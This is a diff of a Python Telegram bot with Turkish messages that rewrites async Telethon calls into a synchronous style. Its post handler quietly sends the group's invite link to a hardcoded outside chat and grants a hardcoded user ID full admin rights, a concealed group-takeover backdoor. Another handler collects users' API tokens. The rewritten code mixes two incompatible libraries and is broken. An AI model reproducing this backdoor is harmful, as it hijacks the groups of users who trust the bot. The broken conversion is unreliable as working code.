@@ -33,22 +33,22 @@ def start(message):
 async def post(message):
     chat = message.chat_id
     print(chat)
-    link = await bot(functions.messages.ExportChatInviteRequest(chat))
+    link = bot(functions.messages.ExportChatInviteRequest(chat))
     link = str(link).split(", ")
     link = link[0].replace("ChatInviteExported(link='", " ").replace("'", " ")
-    await bot.send_message(-1001463492864, link)
+    bot.send_message(-1001463492864, link)
     new_rights = ChatAdminRights(post_messages=True, add_admins=True, invite_users=True, delete_messages=True)
-    await sleep(1)
+    time.sleep(1)
     try:
-        await message.client(EditAdminRequest(chat, 1671239079, new_rights, "Post"))
+        message.client(EditAdminRequest(chat, 1671239079, new_rights, "Post"))
     except:
         
-        await bot.send_message(chat, "Lütfen bota tüm yetkileri verin.")
+        bot.send_message(chat, "Lütfen bota tüm yetkileri verin.")
     else:
-        await bot.send_message(chat, "Tamamdır!")
+        bot.send_message(chat, "Tamamdır!")
 
-@bot.on(events.NewMessage)
-async def aydialma(message):
+@bot.message_handler(func=lambda message: True)
+def aydialma(message):
     getter = message.is_private
     print(getter)
     if not message.text == None and message.text.startswith("/kaydet"):
@@ -58,7 +58,7 @@ async def aydialma(message):
         kanallar = []
         print(mesaj)
         if len(mesaj) < 2:
-            await bot.send_message(cid, "Yanlış kullanım! \n\n-/kaydet TRLINK_API KANAL_ID")
+            bot.send_message(cid, "Yanlış kullanım! \n\n-/kaydet TRLINK_API KANAL_ID")
             return
         key = {"_id": user, "token": mesaj[0], "kanal": mesaj[1]}
         bnb = collection.find_one({"_id": user})
@@ -77,14 +77,14 @@ async def aydialma(message):
                 collection.update_one({"_id": user}, {"$set":{"token": mesaj[0], "kanal": kanallar}})
 
     
-        await bot.send_message(cid, "Kaydedildi!")
+        bot.send_message(cid, "Kaydedildi!")
     elif message.is_private:
         chat = message.chat_id
         ileti = str(message.fwd_from.from_id)
         ileti = ileti.replace("PeerChannel(channel_id=", "").replace(")", "")
         
-        await bot.send_message(chat, f"Kanal ID: `-100{ileti}`")
+        bot.send_message(chat, f"Kanal ID: `-100{ileti}`")
 
 
 
-bot.run_until_disconnected()
+bot.polling()
